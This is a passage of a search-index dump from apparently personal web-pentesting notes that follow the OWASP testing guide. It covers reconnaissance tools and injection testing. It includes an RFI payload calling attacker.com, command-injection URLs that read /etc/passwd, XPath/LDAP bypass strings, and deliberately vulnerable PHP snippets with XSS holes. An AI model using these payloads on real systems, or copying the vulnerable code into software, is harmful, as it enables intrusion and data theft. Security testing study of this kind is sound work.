IP addresses, debugging information, sensitive routes, or even credentials. </p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-05"]},{"location":"OWASP/WSTG-INFO-05/#review-http-comments","title":"Review HTTP comments","text":"<pre><code>&lt;!--\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-05"]},{"location":"OWASP/WSTG-INFO-05/#review-metatags","title":"Review <code>META</code>tags","text":"<p>They do not provide a vector attack directly, but allows an attacker to profile an application:</p> <pre><code>&lt;META name=\"Author\" content=\"John Smith\"&gt;\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-05"]},{"location":"OWASP/WSTG-INFO-05/#review-javascript-comments","title":"Review javascript comments","text":"<pre><code>```\n</code></pre> <p>And</p> <pre><code>/*\n</code></pre> <p>And the <code>&lt;script&gt;</code> tag.</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-05"]},{"location":"OWASP/WSTG-INFO-05/#review-source-map-files","title":"Review Source map files","text":"<p>By adding .map extension to .js files.</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-05"]},{"location":"OWASP/WSTG-INFO-06/","title":"Identify Application Entry Points","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.6. Identify Application Entry Points</p> ID Link to Hackinglife Link to OWASP Objectives 1.6 WSTG-INFO-06 Identify Application Entry Points - Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-06/#workflow","title":"Workflow","text":"","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-06/#requests","title":"Requests","text":"<ul> <li>Identify GET and POST requests.</li> <li>Identify parameters (hidden and not hidden, encoded and not, encrypted and not) in GET and POST requests.</li> <li>Identify other methods. </li> <li>Note additional or custom type headers</li> </ul>","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-06/#responses","title":"Responses","text":"<ul> <li>Identify when the \"Set-cookie\" is used, modified, added.</li> <li>Identify patterns in responses: when you have 200, 302, 400, 403, or 500.</li> <li>Pay attention to the response header \"Server.\" </li> </ul>","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-06/#using-the-attack-surface-detector-plugin","title":"Using the Attack Surface Detector plugin","text":"<p>Download the Attack Surface Detector plugin in BurpSuite from: https://github.com/secdec/attack-surface-detector-cli/releases. </p> <p>Run this command from the Attack Surface Detector plugin:</p> <pre><code>java -jar attack-surface-detector-cli-1.3.5.jar &lt;source-code-path&gt; [flags]\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-06/#enumeration-techniques-for-http-verbs","title":"Enumeration techniques for HTTP verbs","text":"<p>With netcat <pre><code># Send a OPTIONS message with netcat\nnc victim.target 80\nOPTIONS / HTTP/1.0\n</code></pre></p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-06/#using-kiterunner","title":"Using Kiterunner","text":"<p>kiterunner Cheat sheet.</p> <p>Kiterunner is an excellent tool that was developed and released by Assetnote. Kiterunner is currently the best tool available for discovering API endpoints and resources. While directory brute force tools like Gobuster/Dirbuster/ work to discover URL paths, it typically relies on standard HTTP GET requests. Kiterunner will not only use all HTTP request methods common with APIs (GET, POST, PUT, and DELETE) but also mimic common API path structures. In other words, instead of requesting GET /api/v1/user/create, Kiterunner will try POST /api/v1/user/create, mimicking a more realistic request.</p> <p>1. First, download the dictionaries from the project. In my case I downloaded it to /usr/share/wordlists/kiterunner/:</p> <ul> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-large.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-small.json.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz</li> <li>https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz</li> </ul> <p>2. Run a quick scan of your target\u2019s URL or IP address like this:</p> <pre><code>kr scan HTTP://127.0.0.1 -w ~/api/wordlists/data/kiterunner/routes-large.kite  \n</code></pre> <p>But. Note that we conducted this scan without any authorization headers, which the target API likely requires.</p> <p>To use a dictionary (and not a kite file): </p> <pre><code>kr brute &lt;target&gt; -w ~/api/wordlists/data/automated/nameofwordlist.txt\n</code></pre> <p>If you have many targets, you can save a list of line-separated targets as a text file and use that file as the target.</p> <p>One of the coolest Kiterunner features is the ability to replay requests. Thus, not only will you have an interesting result to investigate, you will also be able to dissect exactly why that request is interesting. In order to replay a request, copy the entire line of content into Kiterunner, paste it using the kb replay option, and include the wordlist you used:</p> <pre><code>kr kb replay \"GET     414 [    183,    7,   8]://192.168.50.35:8888/api/privatisations/count 0cf6841b1e7ac8badc6e237ab300a90ca873d571\" -w ~/api/wordlists/data/kiterunner/routes-large.kite\n</code></pre> <p>Running this will replay the request and provide you with the HTTP response.</p> <p>To run Kiterunner providing an authorization token as it could be \"x-access-token\", we can take the full authorization token and add it to your Kiterunner scan with the -H option:</p> <pre><code>kr scan http://IP -w /path/to/dict.txt -H 'x-access-token: eyJhGcwisdfdsfdfsdfsdfsdfdsfdsfddfdf.eyfakefakefakefaketokenfakeken._wcoooooo_kkkkkk_kkkk'\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-06"]},{"location":"OWASP/WSTG-INFO-07/","title":"Map Execution Paths through applications","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.7. Map Execution Paths through applications</p> ID Link to Hackinglife Link to OWASP Objectives 1.7 WSTG-INFO-07 Map Execution Paths Through Application - Map the target application and understand the principal workflows.  - Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough <p>Map  the target application and understand the principal workflows (paths, data flow and race conditions.)</p> <p>You may use authomatic spidering tools such as Zed Attack Proxy (ZAP).</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#spidering","title":"Spidering","text":"","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#httrack","title":"HTTRack","text":"<p>HTTRack tutorial</p> <p>Create a folder for replicating in it your target.</p> <pre><code>mkdir targetsite\nhttrack domain.com  targetsite/\n</code></pre> <p>Interactive mode:</p> <pre><code>httrack\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#eyewitness","title":"EyeWitness","text":"<p>EyeWitness tutorial</p> <p>First, create a file with the target domains, like for instance, listOfdomains.txt.</p> <p>Then, run:</p> <pre><code>eyewitness --web -f listOfdomains.txt -d path/to/save/\n</code></pre> <p>After that you will get a report.html file with the request and a screenshot of those domains.</p> <pre><code># Proxing the request via BurpSuite\neyewitness --web -f listOfdomains.txt -d path/to/save/ --proxy-ip 127.0.0.1 --proxy-port 8080\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#directoryfile-enumeration","title":"Directory/File enumeration","text":"","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#nmap","title":"nmap","text":"<pre><code>nmap -sV -p80 --script=http-enum &lt;target&gt;\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#dirb","title":"dirb","text":"<p>Cheat sheet with dirb.</p> <pre><code>dirb http://domain.com /usr/share/metasploit-framework/data/wordlists/directory.txt\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#gobuster","title":"gobuster","text":"<p>Gobuster:</p> <pre><code>gobuster dir -u &lt;exact target url&gt; -w &lt;/path/dic.txt&gt; -b 403,4.4 -x .php,.txt -r \n# -b: exclude from results an specific http response`\n# -r: follow redirects\n# -x: add to the path provided by dictionary these extensions\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#ffuf","title":"Ffuf","text":"<p>Ffuf:</p> <pre><code>ffuf -w /path/to/wordlist -u https://target/FUZZ\n\n# Assuming that the default virtualhost response size is 4242 bytes, we can filter out all the responses of that size (`-fs 4242`)while fuzzing the Host - header:\nffuf -w /path/to/vhost/wordlist -u https://target -H \"Host: FUZZ\" -fs 4242\n\n# Enumerating directories and folders:\nffuf -recursion -recursion-depth 1 -u http://$ip/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt\n# -recursion: activates the recursive scan\n# -recursion-depth 1: specifies the maximum depth to scan\n\n# fuzz a combination of folder names, with a wordlist of possible files and a dictionary of extensions\nffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://$ip/FOLDERS/WORDLISTEXTENSIONS\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#wfuzz","title":"Wfuzz","text":"<p>Wfuzz</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-07/#feroxbuster","title":"feroxbuster","text":"<p>feroxbuster</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-07"]},{"location":"OWASP/WSTG-INFO-08/","title":"Fingerprint Web Application Framework","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.8. Fingerprint Web Application Framework</p> ID Link to Hackinglife Link to OWASP Objectives 1.8 WSTG-INFO-08 Fingerprint Web Application Framework - Fingerprint the components being used by the web applications.  - Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message.","tags":["web","pentesting","reconnaissance","WSTG-INFO-08"]},{"location":"OWASP/WSTG-INFO-08/#http-headers","title":"HTTP headers","text":"<ul> <li>Note the response header <code>X-Powered-By</code>, or <code>X-Generator</code> as well.</li> <li>Identify framework specific cookies. For instance, the cookie <code>CAKEPHP</code> for php.</li> </ul>","tags":["web","pentesting","reconnaissance","WSTG-INFO-08"]},{"location":"OWASP/WSTG-INFO-08/#html-source-code","title":"HTML source code","text":"<ul> <li>Framework is often include in the <code>META</code> tag.</li> <li>Revise header and footer sections carefully: general markers and specific markers.</li> <li>See typical file and folders structure. An example would be wp-includes folder for a wordpress installation, or a CHANGELOG file for a Drupal one.</li> <li>Check out file extensions, as sometimes they reveals the underlying framework.</li> <li>Revise error messages. They commonly reveals framework.</li> </ul> <p>See WSTG-INFO-07 for a reference to HTTRack for mirrowing the code and EyeWitness. These utilities replicated the source code of the target domain.</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-08"]},{"location":"OWASP/WSTG-INFO-08/#tools","title":"Tools","text":"<p>1. HTTP headers:</p> <p>X-Powered-By and cookies:  - .NET: <code>ASPSESSIONID&lt;RANDOM&gt;=&lt;COOKIE_VALUE&gt;</code> - PHP: <code>PHPSESSID=&lt;COOKIE_VALUE&gt;</code> - JAVA: <code>JSESSION=&lt;COOKIE_VALUE&gt;</code></p> <p>2. whatweb.</p> <pre><code>whatweb -a3 https://www.example.com -v\n# -a3: aggression level 3\n# -v: verbose mode\n</code></pre> <p>3. Wappalyzer: https://www.wappalyzer.com.</p> <p>4. wafw00f:</p> <pre><code>wafw00f -v https://www.example.com\n\n# -a: check all possible WAFs in place instead of stopping scanning at the first match.\n# -i: read targets from an input file \n# -p proxy the requests \n</code></pre> <p>5. Aquatone</p> <pre><code>cat example_of_list.txt | aquatone -out ./aquatone -screenshot-timeout 1000\n</code></pre> <p>6. Addons for browsers: </p> <ul> <li>BuiltWith: BuiltWith\u00ae covers 93,551+ internet technologies which include analytics, advertising, hosting, CMS and many more.</li> </ul> <p>7. Curl:</p> <pre><code>curl -IL https://&lt;TARGET&gt;\n# -I: --head (HTTP  FTP  FILE) Fetch the headers only!\n# -L, --location: (HTTP) If the server reports that the requested page has moved to a different location (indicated with a Location: header and a 3XX response  code),  this  option  will make  curl  redo the request on the new place. If used together with -i, --include or -I, --head, headers from all requested pages will be shown. \n</code></pre> <p>8. nmap:</p> <pre><code>sudo nmap -v $ip --script banner.nse\n</code></pre>","tags":["web","pentesting","reconnaissance","WSTG-INFO-08"]},{"location":"OWASP/WSTG-INFO-09/","title":"Fingerprint Web Applications","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.9. Fingerprint Web Applications</p> ID Link to Hackinglife Link to OWASP Objectives 1.9 WSTG-INFO-09 Fingerprint Web Application N/A, This content has been merged into: WSTG-INFO-08 <p>This content has been merged to Fingerprint Web Application Frameworks.</p>","tags":["web","pentesting","reconnaissance","WSTG-INFO-09"]},{"location":"OWASP/WSTG-INFO-10/","title":"Map Application architecture","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 1. Information Gathering &gt; 1.10. Map Application architecture</p> ID Link to Hackinglife Link to OWASP Objectives 1.10 WSTG-INFO-10 Map Application Architecture - Understand the architecture of the application and the technologies in use. - Identify application architecture whether on Application and Network components: Applicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs , Network and Security: Reverse proxy, IPS, WAF <ul> <li>In a blind testing, start with the assumption that there is a simple setup (a single server.)</li> <li>Then, question if there is a firewall protecting the web server.</li> <li>Is it a stateful firewall or is it an access list filter on a router?  Is it bypasseable?</li> <li>See response headers and try to identify a typical firewall response header.</li> <li>Reverse proxies might be in use, and configured as Intrusion Prevention System.</li> <li>Application- level firewall might be in use. </li> <li>Proxy-caches can be in use.</li> <li>Is there a Load Balancer in place? F5 BIG-IP load balancers introduces some prefixed  cookies.</li> <li>Some application web servers include values in the response or rewrite URLS  automatically to do session tracking.</li> </ul>","tags":["web","pentesting","reconnaissance","WSTG-INFO-10"]},{"location":"OWASP/WSTG-INPV-01/","title":"Testing for Reflected Cross Site Scripting","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.1. Testing for Reflected Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 7.1 WSTG-INPV-01 Testing for Reflected Cross Site Scripting - Identify variables that are reflected in responses.  - Assess the input they accept and the encoding that gets applied on return (if any). <p>Reflected\u00a0Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response. The injected attack is not stored within the application itself; it is non-persistent and only impacts users who open a maliciously crafted link or third-party web page. When a web application is vulnerable to this type of attack, it will pass unvalidated input sent through requests back to the client.</p> <p>XSS Filter Evasion Cheat Sheet</p>","tags":["web pentesting","WSTG-INPV-01"]},{"location":"OWASP/WSTG-INPV-01/#causes","title":"Causes","text":"<p>This vulnerable PHP code in a welcome page may lead to an XSS attack:</p> <pre><code>&lt;?php $name = @$_GET['name']; ?&gt;\n\nWelcome &lt;?=$name?&gt;\n</code></pre>","tags":["web pentesting","WSTG-INPV-01"]},{"location":"OWASP/WSTG-INPV-01/#attack-techniques","title":"Attack techniques","text":"<p>Go to my XSS cheat sheet</p>","tags":["web pentesting","WSTG-INPV-01"]},{"location":"OWASP/WSTG-INPV-02/","title":"Testing for Stored Cross Site Scripting","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.2. Testing for Stored Cross Site Scripting</p> ID Link to Hackinglife Link to OWASP Description 7.2 WSTG-INPV-02 Testing for Stored Cross Site Scripting - Identify stored input that is reflected on the client-side.  - Assess the input they accept and the encoding that gets applied on return (if any). <p>Stored cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application\u2019s database or source code via an input that is not sanitized. For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitization, the XSS payload injected in to the webpage will be  executed by the browser of anyone that visits that webpage.</p>","tags":["web pentesting","WSTG-INPV-02"]},{"location":"OWASP/WSTG-INPV-02/#causes","title":"Causes","text":"<p>This vulnerable PHP code in a welcome page may lead to a stored XSS attack:</p> <pre><code>&lt;?php \n$file  = 'newcomers.log';\nif(@$_GET['name']){\n    $current = file_get_contents($file);\n    $current .= $_GET['name'].\"\\n\";\n    //store the newcomer\n    file_put_contents($file, $current);\n}\n//If admin show newcomers\nif(@$_GET['admin']==1)\n    echo file_get_contents($file);\n?&gt;\n\nWelcome &lt;?=$name?&gt;\n</code></pre>","tags":["web pentesting","WSTG-INPV-02"]},{"location":"OWASP/WSTG-INPV-02/#attack-techniques","title":"Attack techniques","text":"<p>Go to my XSS cheat sheet</p>","tags":["web pentesting","WSTG-INPV-02"]},{"location":"OWASP/WSTG-INPV-03/","title":"Testing for HTTP Verb Tampering","text":"<p>OWASP</p> <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.3. Testing for HTTP Verb Tampering</p> ID Link to Hackinglife Link to OWASP Description 7.3 WSTG-INPV-03 Testing for HTTP Verb Tampering N/A, This content has been merged into: WSTG-CONF-06 <p>This content has been merged into:\u00a0Test HTTP Methods</p>","tags":["web pentesting","WSTG-INPV-03"]},{"location":"OWASP/WSTG-INPV-04/","title":"Testing for HTTP Parameter Pollution","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.4. Testing for HTTP Parameter Pollution</p> ID Link to Hackinglife Link to OWASP Description 7.4 WSTG-INPV-04 Testing for HTTP Parameter Pollution - Identify the backend and the parsing method used.  - Assess injection points and try bypassing input filters using HPP.","tags":["web pentesting","WSTG-INPV-04"]},{"location":"OWASP/WSTG-INPV-05/","title":"Testing for SQL Injection","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.5. Testing for SQL Injection</p> ID Link to Hackinglife Link to OWASP Description 7.5 WSTG-INPV-05 Testing for SQL Injection - Identify SQL injection points.  - Assess the severity of the injection and the level of access that can be achieved through it. <p>SQL injection testing checks if it is possible to inject data into an application/site so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. </p>","tags":["web pentesting","WSTG-INPV-05"]},{"location":"OWASP/WSTG-INPV-05/#see-my-notes","title":"See my notes","text":"<ul> <li>SQL injection: What is it. How this attack works. Attack classification. Types of databases. Payloads. Dictionaries.</li> <li>NoSQL injection: What is it. Typical payloads.</li> <li>Manual attack.</li> </ul>","tags":["web pentesting","WSTG-INPV-05"]},{"location":"OWASP/WSTG-INPV-06/","title":"Testing for LDAP Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.6. Testing for LDAP Injection</p> ID Link to Hackinglife Link to OWASP Description 7.6 WSTG-INPV-06 Testing for LDAP Injection - Identify LDAP injection points:  /ldapsearch?user=  user=user=)(uid=))(|(uid=*  pass=password  - Assess the severity of the injection:","tags":["web pentesting","WSTG-INPV-06"]},{"location":"OWASP/WSTG-INPV-07/","title":"Testing for XML Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.7. Testing for XML Injection</p> ID Link to Hackinglife Link to OWASP Description 7.7 WSTG-INPV-07 Testing for XML Injection - Identify XML injection points with XML Meta Characters:  ', \" , &lt;&gt;, , &amp;, &lt;![CDATA[ / ]]&gt;, XXE, TAG  - Assess the types of exploits that can be attained and their severities.","tags":["web pentesting","WSTG-INPV-07"]},{"location":"OWASP/WSTG-INPV-08/","title":"Testing for SSI Injection","text":"OWASP <pre><code>[OWASP Web Security Testing Guide 4.2](index.md) &gt; 7. Data Validation Testing &gt; 7.8. Testing for SSI Injection\n</code></pre> ID Link to Hackinglife Link to OWASP Description 7.8 WSTG-INPV-08 Testing for SSI Injection - Identify SSI injection points (Presense of .shtml extension) with these characters:  &lt; ! # = / . \" - &gt; and [a-zA-Z0-9]  - Assess the severity of the injection.","tags":["web pentesting","WSTG-INPV-08"]},{"location":"OWASP/WSTG-INPV-08/#server-side-includes-ssi-injection","title":"Server-Side Includes (SSI) Injection","text":"<p>SSIs are directives present on Web applications used to feed an HTML page with dynamic contents. They are similar to CGIs, except that SSIs are used to execute some actions before the current page is loaded or while the page is being visualized. In order to do so, the web server analyzes SSI before supplying the page to the user.</p> <p>SSI can lead to a Remote Command Execution (RCE), however most webservers have the exec directive disabled by default.</p>","tags":["web pentesting","WSTG-INPV-08"]},{"location":"OWASP/WSTG-INPV-09/","title":"Testing for XPath Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.9. Testing for XPath Injection</p> ID Link to Hackinglife Link to OWASP Description 7.9 WSTG-INPV-09 Testing for XPath Injection - Identify XPATH injection points by checking for XML error enumeration by supplying a single quote ('):  Username: \u2018 or \u20181\u2019 = \u20181  Password: \u2018 or \u20181\u2019 = \u20181","tags":["web pentesting","WSTG-INPV-09"]},{"location":"OWASP/WSTG-INPV-10/","title":"Testing for IMAP SMTP Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.10. Testing for IMAP SMTP Injection</p> ID Link to Hackinglife Link to OWASP Description 7.10 WSTG-INPV-10 Testing for IMAP SMTP Injection - Identify IMAP/SMTP injection points (Header, Body, Footer) with special characters (i.e.: \\, \u2018, \u201c, @, #, !, |)  - Understand the data flow and deployment structure of the system.  - Assess the injection impacts.","tags":["web pentesting","WSTG-INPV-10"]},{"location":"OWASP/WSTG-INPV-11/","title":"Testing for Code Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.11. Testing for Code Injection</p> ID Link to Hackinglife Link to OWASP Description 7.11 WSTG-INPV-11 Testing for Code Injection - Identify injection points where you can inject code into the application.  - Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).  - Check RFI from malicious URL  ?page.php?file=http://attacker.com/malicious_page  - Assess the injection severity.","tags":["web pentesting","WSTG-INPV-11"]},{"location":"OWASP/WSTG-INPV-11/#local-file-inclusion","title":"Local File Inclusion","text":"<p>See my notes on Local File Inclusion</p>","tags":["web pentesting","WSTG-INPV-11"]},{"location":"OWASP/WSTG-INPV-12/","title":"Testing for command injection","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.12. Testing for Command Injection</p> ID Link to Hackinglife Link to OWASP Description 7.12 WSTG-INPV-12 Testing for Command Injection - Identify and assess the command injection points with special characters (i.e.: | ; &amp; $ &gt; &lt; ' !)  For example: ?doc=Doc1.pdf+|+Dir c:| <p>Command injection vulnerabilities in the context of web application penetration testing occur when an attacker can manipulate the input fields of a web application in a way that allows them to execute arbitrary operating system commands on the underlying server. This type of vulnerability is a serious security risk because it can lead to unauthorized access, data theft, and full compromise of the web server.</p> <p>Causes:</p> <ul> <li>User Input Handling: Web applications often take user input through forms, query parameters, or other means. </li> <li>Lack of Input Sanitization: Insecurely coded applications may fail to properly validate, sanitize, or escape user inputs before using them in system commands.</li> <li>Injection Points: Attackers identify injection points, such as input fields or URL query parameters, where they can insert malicious commands.</li> </ul> <p>Impact:</p> <ul> <li>Unauthorized Execution: Attackers can execute arbitrary commands with the privileges of the web server process. This can lead to unauthorized data access, code execution, or system compromise.</li> <li>Data Exfiltration: Attackers can exfiltrate sensitive data, such as database content, files, or system configurations.</li> <li>System Manipulation: Attackers may manipulate the server, installmalware, or create backdoors for future access.</li> </ul>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#how-to-test","title":"How to Test","text":"<p>Malicious Input: Attackers craft input that includes special characters, like semicolons, pipes, backticks, and other shell metacharacters, to break out of the intended input context and inject their commands. Command Execution: When the application processes the attacker's input, it constructs a shell command using the malicious input.  The server, believing the command to be legitimate, executes it in the underlying operating system</p>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#case-study-perl","title":"Case Study: Perl","text":"<p>When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol | onto the end of the filename.</p> <pre><code># Example URL before alteration\nhttp://sensitive/cgi-bin/userData.pl?doc=user1.txt \n\n# Example URL modified\nhttp://sensitive/cgi-bin/userData.pl?doc=/bin/ls|\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#php-code-injection","title":"PHP code injection","text":"<p>PHP code injection vulnerabilities, also known as PHP code execution vulnerabilities, occur when an attacker can inject and execute arbitrary PHP code within a web  application. These vulnerabilities are a serious security concern because they allow attackers to gain unauthorized access to the server, execute malicious actions, and potentially compromise the entire web application.</p> <p>Malicious Input: Attackers craft input that includes PHP code snippets, often enclosed within PHP tags (&lt;?php ... ?&gt;) or backticks (`). </p> <p>Code Execution: When the application processes the attacker's input, it includes the injected PHP code as part of a PHP script that is executed on the server.</p> <p>This allows the attacker to run arbitrary PHP code in the context of the web application. </p> <p>Command injection: Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. %3B is URL encoded and decodes to semicolon </p> <pre><code># Directly injecting operating system commands:\nhttp://sensitive/something.php?dir=%3Bcat%20/etc/passwd\n\n########\n# Injecting PHP commands\n#########\n\n# Validating that the injection is possible\nhttp://example.com/page.php?message=test;phpinfo();\nhttp://example.com/page.php?id=1'];phpinfo();\n\n# Executing PHP commands\nhttp://example.com/page.php?message=test;system(cat%20/etc/passwd)\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#special-characters-for-command-injection","title":"Special characters for command injection","text":"<p>The following special character can be used for command injection such as:</p> <pre><code>| ; &amp; $ &gt; &lt; ' ! \n</code></pre> <pre><code># Uses of | will make command 2 to be executed weather command 1 execution is successful or not.\ncmd1|cmd2\n\n# Uses of ; will make command 2 to be executed weather command 1 execution is successful or not.\ncmd1;cmd2\n\n# Command 2 will only be executed if command 1 execution fails. \ncmd1||cmd2\n\n\n# Command 2 will only be executed if command 1 execution succeeds. \ncmd1&amp;&amp;cmd2\n\n# For example, echo $(whoami) or $(touch test.sh; echo 'ls' &gt; test.sh)\n$(cmd)\n\n# It\u2019s used to execute specific command. For example, whoami \ncmd\n\n&gt;(cmd) : &gt;(ls) \n&lt;(cmd) : &lt;(ls)\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#code-review-dangerous-api","title":"Code Review Dangerous API","text":"<p>Be aware of the uses of following API as it may introduce the command injection risks. </p>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#java","title":"Java","text":"<pre><code>Runtime.exec()\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#cc","title":"C/C++","text":"<pre><code>system \nexec \nShellExecute\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#python","title":"Python","text":"<pre><code>exec\neval\nos.system\nos.popen\nsubprocess.popen\nsubprocess.call\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-12/#php","title":"PHP","text":"<pre><code>system\nshell_exec \nexec\nproc_open \neval\n</code></pre>","tags":["web pentesting","WSTG-INPV-12"]},{"location":"OWASP/WSTG-INPV-13/","title":"Testing for Format String Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.13. Testing for Format String Injection</p> ID Link to Hackinglife Link to OWASP Description 7.13 WSTG-INPV-13 Testing for Format String Injection - Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.","tags":["web pentesting","WSTG-INPV-13"]},{"location":"OWASP/WSTG-INPV-14/","title":"Testing for Incubated Vulnerability","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.14. Testing for Incubated Vulnerability</p> ID Link to Hackinglife Link to OWASP Description 7.14 WSTG-INPV-14 Testing for Incubated Vulnerability - Identify injections that are stored and require a recall step to the stored injection. (i.e.: CSV Injection, Blind Stored XSS, File Upload)  - Understand how a recall step could occur.  - Set listeners or activate the recall step if possible.","tags":["web pentesting","WSTG-INPV-14"]},{"location":"OWASP/WSTG-INPV-15/","title":"Testing for HTTP Splitting Smuggling","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.15. Testing for HTTP Splitting Smuggling</p> ID Link to Hackinglife Link to OWASP Description 7.15 WSTG-INPV-15 Testing for HTTP Splitting Smuggling - Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable. - Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.","tags":["web pentesting","WSTG-INPV-15"]},{"location":"OWASP/WSTG-INPV-16/","title":"Testing for HTTP Incoming Requests","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.16. Testing for HTTP Incoming Requests</p> ID Link to Hackinglife Link to OWASP Description 7.16 WSTG-INPV-16 Testing for HTTP Incoming Requests - Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests. - Monitor HTTP traffic without changes of end user Browser proxy or client-side application.","tags":["web pentesting","WSTG-INPV-16"]},{"location":"OWASP/WSTG-INPV-17/","title":"Testing for Host Header Injection","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.17. Testing for Host Header Injection</p> ID Link to Hackinglife Link to OWASP Description 7.17 WSTG-INPV-17 Testing for Host Header Injection - Assess if the Host header is being parsed dynamically in the application.  - Bypass security controls that rely on the header. <p>The goal:</p> <ul> <li>Assess if the Host header is being parsed dynamically in the application.</li> <li>Bypass security controls that rely on the header.</li> </ul> <p>Source: 